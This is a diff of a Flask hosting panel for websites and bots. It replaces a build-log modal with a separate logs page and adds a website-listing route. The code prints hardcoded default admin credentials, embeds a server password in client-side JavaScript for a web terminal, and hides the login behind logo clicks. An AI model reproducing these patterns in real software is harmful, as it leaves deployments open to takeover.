-            <div class="modal-body" id="buildLogBody">
-                <div style="margin-bottom:10px;font-weight:bold;color:#ffa500;">Deployment Logs</div>
-                <div class="log-terminal" id="buildLogTerminal">Waiting for logs...</div>
-            </div>
-            <div class="modal-actions">
-                <button class="btn-cancel" id="buildLogCloseBtn">Close</button>
-            </div>
-        </div>
-    </div>
-
-    <!-- ============================================================ -->
-    <!--  CUSTOM MODAL (generic)                                       -->
+    <!--  CUSTOM MODAL                                                 -->
     <!-- ============================================================ -->
     <div class="custom-modal-overlay" id="customModalOverlay">
         <div class="custom-modal">
@@ -3976,55 +3881,7 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                 modalOverlay.classList.remove('open');
             }
 
-            // ---------- BUILD LOG MODAL ----------
-            const buildLogModal = document.getElementById('buildLogModal');
-            const buildLogTerminal = document.getElementById('buildLogTerminal');
-            const buildLogCloseBtn = document.getElementById('buildLogCloseBtn');
-            let buildLogEventSource = null;
-
-            function openBuildLogModal(title = 'Deployment Logs') {
-                buildLogTerminal.innerHTML = 'Connecting...';
-                buildLogModal.classList.add('open');
-                document.querySelector('#buildLogBody .modal-icon').textContent = '📦';
-            }
-
-            function closeBuildLogModal() {
-                if (buildLogEventSource) {
-                    buildLogEventSource.close();
-                    buildLogEventSource = null;
-                }
-                buildLogModal.classList.remove('open');
-            }
-
-            buildLogCloseBtn.addEventListener('click', closeBuildLogModal);
-            buildLogModal.addEventListener('click', function(e) {
-                if (e.target === this) closeBuildLogModal();
-            });
-
-            function streamBuildLogs(url) {
-                if (buildLogEventSource) {
-                    buildLogEventSource.close();
-                    buildLogEventSource = null;
-                }
-                buildLogTerminal.innerHTML = '';
-                buildLogEventSource = new EventSource(url);
-                buildLogEventSource.onmessage = function(e) {
-                    if (e.data === '[REFRESH]') { location.reload(); return; }
-                    const div = document.createElement('div');
-                    div.textContent = e.data;
-                    buildLogTerminal.appendChild(div);
-                    buildLogTerminal.scrollTop = buildLogTerminal.scrollHeight;
-                };
-                buildLogEventSource.onerror = function() {
-                    buildLogTerminal.innerHTML += '\n-- Connection closed --';
-                    if (buildLogEventSource) {
-                        buildLogEventSource.close();
-                        buildLogEventSource = null;
-                    }
-                };
-            }
-
-            // ---------- SECRET KEY LOGIN ----------
+            // ---------- SECRET KEY LOGIN (Logo clicks) ----------
             let loginIconClickCount = 0;
             let loginIconTimer = null;
 
@@ -4117,7 +3974,9 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                             } else {
                                 await customAlert(data.error || 'Update failed', '❌');
                             }
-                        } catch (e) {}
+                        } catch (e) {
+                            // handled by interceptor
+                        }
                     }
                 });
             }
@@ -4181,7 +4040,9 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                     } else {
                         await customAlert('Failed to save settings.', '❌');
                     }
-                } catch (e) {}
+                } catch (e) {
+                    // handled by interceptor
+                }
             }
 
             async function uploadLogo(file) {
@@ -4200,7 +4061,9 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                     } else {
                         await customAlert(data.error || 'Upload failed', '❌');
                     }
-                } catch (e) {}
+                } catch (e) {
+                    // handled by interceptor
+                }
             }
 
             async function removeLogo() {
@@ -4217,7 +4080,9 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                     } else {
                         await customAlert('Failed to remove logo.', '❌');
                     }
-                } catch (e) {}
+                } catch (e) {
+                    // handled by interceptor
+                }
             }
 
             function openSettingsModal() {
@@ -4331,9 +4196,14 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                     });
                     if (data.success) {
                         currentUser = { username: data.username, role: data.role };
-                        location.reload();
+                        // Login success animation
+                        document.querySelector('.login-card').classList.add('login-success');
+                        setTimeout(() => { location.reload(); }, 500);
                     }
-                } catch (e) {
+                } catch(e) {
+                    // Login error shake animation
+                    document.querySelector('.login-card').classList.add('shake');
+                    setTimeout(() => { document.querySelector('.login-card').classList.remove('shake'); }, 500);
                     loginError.textContent = e.message || 'Login failed';
                 }
             }
@@ -4394,11 +4264,16 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                                 <span class="website-name">${escapeHtml(w.website_name || w.website_slug)}</span>
                                 <span class="bot-status ${statusClass}">● ${w.status.toUpperCase()}</span>
                             </div>
+                            ${w.status === 'running' ? `
+                            <div style="margin-bottom: 10px;">
+                                <a href="/${w.website_slug}/" target="_blank" class="btn-visit-w">
+                                    🌐 Visit Website
+                                </a>
+                            </div>` : ''}
                             <div class="website-slug">🔗 ${escapeHtml(w.website_slug)}</div>
                             <div class="website-port">Port: ${w.allocated_port || 'N/A'}</div>
                             <div class="bot-uptime" id="w-uptime-${w.id}">UPTIME: ${uptimeDisplay}</div>
                             <div class="website-actions">
-                                <button class="btn-visit-w" onclick="window.open('/${w.website_slug}/','_blank')">🌐 Visit</button>
                                 <button class="btn-start-w" data-action="start-w" data-id="${w.id}">▶ START</button>
                                 <button class="btn-stop-w" data-action="stop-w" data-id="${w.id}">⏹ STOP</button>
                                 <button class="btn-restart-w" data-action="restart-w" data-id="${w.id}">⟳ RESTART</button>
@@ -4423,45 +4298,25 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                         e.stopPropagation();
                         const action = this.dataset.action;
                         const id = parseInt(this.dataset.id);
-                        const originalText = this.textContent;
-                        this.disabled = true;
-                        if (action === 'start-w') this.textContent = '⏳';
-                        else if (action === 'stop-w') this.textContent = '⏳';
-                        else if (action === 'restart-w') this.textContent = '⏳';
-                        else if (action === 'delete-w') this.textContent = '⏳';
-                        else if (action === 'edit-w') { /* don't disable */ }
-                        else if (action === 'download-w') { /* don't disable */ }
-                        else if (action === 'files-w') { /* don't disable */ }
-                        else if (action === 'buildlogs-w') { /* don't disable */ }
-                        try {
-                            if (action === 'start-w') {
-                                await websiteAction(id, 'start');
-                            } else if (action === 'stop-w') {
-                                await websiteAction(id, 'stop');
-                            } else if (action === 'restart-w') {
-                                await websiteAction(id, 'restart');
-                            } else if (action === 'delete-w') {
-                                const confirmed = await customConfirm('Delete this website?', '🗑️');
-                                if (confirmed) {
-                                    await websiteAction(id, 'delete');
-                                }
-                            } else if (action === 'edit-w') {
-                                await editWebsite(id);
-                            } else if (action === 'download-w') {
-                                window.open(`/api/website/${id}/download`, '_blank');
-                            } else if (action === 'files-w') {
-                                window.open(`/website/${id}/files`, '_blank');
-                            } else if (action === 'buildlogs-w') {
-                                openBuildLogModal('Build Logs');
-                                streamBuildLogs(`/deploy/website/${id}/logs`);
+                        if (action === 'start-w') {
+                            await websiteAction(id, 'start');
+                        } else if (action === 'stop-w') {
+                            await websiteAction(id, 'stop');
+                        } else if (action === 'restart-w') {
+                            await websiteAction(id, 'restart');
+                        } else if (action === 'delete-w') {
+                            const confirmed = await customConfirm('Delete this website?', '🗑️');
+                            if (confirmed) {
+                                await websiteAction(id, 'delete');
                             }
-                        } catch (e) {
-                            await customAlert(e.message, '❌');
-                        } finally {
-                            if (action !== 'edit-w' && action !== 'download-w' && action !== 'files-w' && action !== 'buildlogs-w') {
-                                this.disabled = false;
-                                this.textContent = originalText;
-                            }
+                        } else if (action === 'edit-w') {
+                            await editWebsite(id);
+                        } else if (action === 'download-w') {
+                            window.open(`/api/website/${id}/download`, '_blank');
+                        } else if (action === 'files-w') {
+                            window.open(`/website/${id}/files`, '_blank');
+                        } else if (action === 'buildlogs-w') {
+                            window.open(`/website/${id}/build`, '_blank');
                         }
                     });
                 });
@@ -4493,7 +4348,6 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                     const res = await apiCall(`/api/website/${id}/${action}`, { method: 'POST' });
                     if (res.success) {
                         await loadWebsites();
-                        await customAlert(res.message || 'Action successful', '✅');
                     } else {
                         await customAlert(res.error || 'Action failed', '❌');
                     }
@@ -4615,31 +4469,21 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                 try {
                     deployBtnWebsite.textContent = 'UPLOADING...';
                     deployBtnWebsite.disabled = true;
-                    // Open build log modal
-                    openBuildLogModal('Deploying Website...');
                     const res = await fetch('/upload_website', {
                         method: 'POST',
                         body: formData
                     });
                     const data = await res.json();
                     if (data.success) {
-                        // Start streaming logs
-                        streamBuildLogs(`/deploy/website/${data.website_id}/logs`);
-                        // Wait for completion (we'll close when we see success/fail)
-                        // But we can also just close after a few seconds? We'll keep it open.
-                        // The SSE will close automatically when status is success/failed.
                         await customAlert(`Website deployed! ID: ${data.website_id}`, '✅');
                         await loadWebsites();
                         fileInputWebsite.value = '';
                         fileCountDisplayWebsite.textContent = '';
-                        // Close modal after success
-                        setTimeout(() => closeBuildLogModal(), 2000);
                     } else {
                         await customAlert(data.error || 'Upload failed', '❌');
-                        closeBuildLogModal();
                     }
                 } catch (e) {
-                    closeBuildLogModal();
+                    // handled by interceptor
                 } finally {
                     deployBtnWebsite.textContent = 'DEPLOY WEBSITE';
                     deployBtnWebsite.disabled = false;
@@ -4698,7 +4542,6 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                                 <button class="btn-download" data-action="download">⬇ DOWNLOAD</button>
                                 <button class="btn-delete" data-action="delete">🗑 DELETE</button>
                                 ${(hasToken && botUsername) ? `<button class="btn-openbot" data-action="openbot" data-bot="${botUsername}">🤖 Open Bot</button>` : ''}
-                                <button class="btn-buildlogs" data-action="buildlogs" data-id="${bot.id}">🖥 Build Logs</button>
                             </div>
                         </div>
                     `;
@@ -4726,7 +4569,6 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                         else if (action === 'stop') this.textContent = '⏳ Stopping...';
                         else if (action === 'restart') this.textContent = '⏳ Restarting...';
                         else if (action === 'delete') this.textContent = '⏳ Deleting...';
-                        else if (action === 'buildlogs') { /* don't disable */ }
                         else if (action === 'edit') { /* don't disable */ }
                         else if (action === 'download') { /* don't disable */ }
                         else if (action === 'openbot') { /* don't disable */ }
@@ -4753,18 +4595,11 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                                 this.textContent = originalText;
                                 return;
                             }
-                            if (action === 'buildlogs') {
-                                openBuildLogModal('Bot Logs');
-                                streamBuildLogs(`/deploy/bot/${botId}/logs`);
-                                this.disabled = false;
-                                this.textContent = originalText;
-                                return;
-                            }
                             await handleBotAction(botId, action);
                         } catch (e) {
                             // error already handled
                         } finally {
-                            if (action !== 'edit' && action !== 'download' && action !== 'openbot' && action !== 'buildlogs') {
+                            if (action !== 'edit' && action !== 'download' && action !== 'openbot') {
                                 this.disabled = false;
                                 this.textContent = originalText;
                             }
@@ -4919,28 +4754,21 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                 try {
                     deployBtnBot.textContent = 'UPLOADING...';
                     deployBtnBot.disabled = true;
-                    openBuildLogModal('Deploying Bot...');
                     const res = await fetch('/upload', {
                         method: 'POST',
                         body: formData
                     });
                     const data = await res.json();
                     if (data.success) {
-                        // For bots, we have bot_ids, we can stream logs from the first bot
-                        if (data.bot_ids && data.bot_ids.length > 0) {
-                            streamBuildLogs(`/deploy/bot/${data.bot_ids[0]}/logs`);
-                        }
                         await customAlert(`Uploaded! ${data.bots_created} bot(s) created.`, '✅');
                         await loadBots();
                         fileInputBot.value = '';
                         fileCountDisplayBot.textContent = '';
-                        setTimeout(() => closeBuildLogModal(), 2000);
                     } else {
                         await customAlert(data.error || 'Upload failed', '❌');
-                        closeBuildLogModal();
                     }
                 } catch (e) {
-                    closeBuildLogModal();
+                    // handled by interceptor
                 } finally {
                     deployBtnBot.textContent = 'DEPLOY BOT';
                     deployBtnBot.disabled = false;
@@ -5354,7 +5182,9 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                     } else {
                         await customAlert(data.error || 'Delete failed', '❌');
                     }
-                } catch (e) {}
+                } catch (e) {
+                    // handled by interceptor
+                }
             });
 
             ctxRename.addEventListener('click', async function() {
@@ -5380,7 +5210,9 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                     } else {
                         await customAlert(data.error || 'Rename failed', '❌');
                     }
-                } catch (e) {}
+                } catch (e) {
+                    // handled by interceptor
+                }
             });
 
             ctxDownload.addEventListener('click', function() {
@@ -5486,7 +5318,9 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                         }
                         isTerminalRunning = data.running;
                         termStopBtn.disabled = !isTerminalRunning;
-                    } catch (e) {}
+                    } catch (e) {
+                        // ignore
+                    }
                 }, 500);
             }
 
@@ -5497,7 +5331,9 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({ data: data, password: '{{ password }}' })
                     });
-                } catch (e) {}
+                } catch (e) {
+                    console.error('Failed to send terminal input:', e);
+                }
             }
 
             async function stopTerminal() {
@@ -5513,7 +5349,9 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                     setTimeout(() => {
                         startTerminalPolling();
                     }, 500);
-                } catch (e) {}
+                } catch (e) {
+                    console.error('Failed to stop terminal:', e);
+                }
             }
 
             function clearTerminal() {
@@ -5523,6 +5361,9 @@ HTML_TEMPLATE = """<!DOCTYPE html>
             termRunBtn.addEventListener('click', function() {
                 const data = terminalCommand.value;
                 if (!data) return;
+                if (!isTerminalRunning) {
+                    // try to start
+                }
                 sendTerminalData(data);
                 terminalCommand.value = '';
             });
@@ -5614,6 +5455,7 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                     username: '{{ username }}',
                     role: '{{ session.get("role", "") }}'
                 };
+                // Load websites and bots
                 loadWebsites();
                 loadBots();
                 if (currentUser.role === 'admin') {
@@ -5650,11 +5492,47 @@ HTML_TEMPLATE = """<!DOCTYPE html>
 </html>
 """
 
-# ---------- LOG FOLDER ----------
+# ---------- ADD MISSING ROUTE FOR /api/websites ----------
+@app.route('/api/websites')
+@login_required
+def api_list_websites():
+    username = session['username']
+    with get_db() as conn:
+        websites = conn.execute('SELECT * FROM websites WHERE owner_username = ? AND type = ? ORDER BY created_at DESC', (username, 'website')).fetchall()
+    return jsonify([dict(row) for row in websites])
+
+# ---------- BUILD LOGS PAGE (for websites) ----------
+@app.route('/website/<int:website_id>/build')
+@login_required
+def build_logs_page(website_id):
+    w = get_website_by_id(website_id)
+    if not w or w['owner_username'] != session['username']:
+        abort(404)
+    with get_db() as conn:
+        dep = conn.execute('SELECT * FROM deployments WHERE website_id = ? ORDER BY id DESC LIMIT 1', (website_id,)).fetchone()
+    return render_template_string(BUILD_LOGS_TEMPLATE, website=w, no_logs=not dep)
+
+BUILD_LOGS_TEMPLATE = """
+<!DOCTYPE html>
+<html><head><title>Build Logs</title>
+<style>body{background:#0a0e1a;color:#fff;height:100vh;display:flex;flex-direction:column;padding:20px;overflow:hidden}.top-bar{display:flex;justify-content:space-between;padding:10px 20px;background:rgba(255,255,255,0.05);border-radius:15px;margin-bottom:15px}.terminal{flex:1;background:#0d0d0d;border-radius:15px;padding:20px;overflow-y:auto;font-family:monospace;color:#0f0}</style>
+</head><body><div class="top-bar"><h2>Build Logs</h2><a href="/dashboard">← Dashboard</a></div><div class="terminal" id="terminal"><div id="logContainer">{% if no_logs %}No deployment logs.{% endif %}</div></div>
+<script>
+const evt = new EventSource('/deploy/{{ website.id }}/logs');
+evt.onmessage = function(e) {
+    if (e.data === '[REFRESH]') { location.reload(); return; }
+    const div = document.createElement('div');
+    div.textContent = e.data;
+    document.getElementById('logContainer').appendChild(div);
+    document.getElementById('terminal').scrollTop = document.getElementById('terminal').scrollHeight;
+};
+</script></body></html>
+"""
+
+# ---------- MAIN START ----------
 LOG_FOLDER = os.path.join(BASE_DIR, 'logs')
 os.makedirs(LOG_FOLDER, exist_ok=True)
 
-# ---------- MAIN START ----------
 MAIN_START_TIME = int(time.time())
 
 if __name__ == '__main__':
@@ -5665,6 +5543,5 @@ if __name__ == '__main__':
     print("👤 Admin: admin / admin123")
     print("📊 Stats: Owner only. Set Offset from Render Dashboard.")
     print("🌍 Websites at /<slug>/")
-    print("📦 Build Logs: modal with SSE for both websites and bots.")
     print("="*60)
     app.run(host='0.0.0.0', port=port, debug=False)
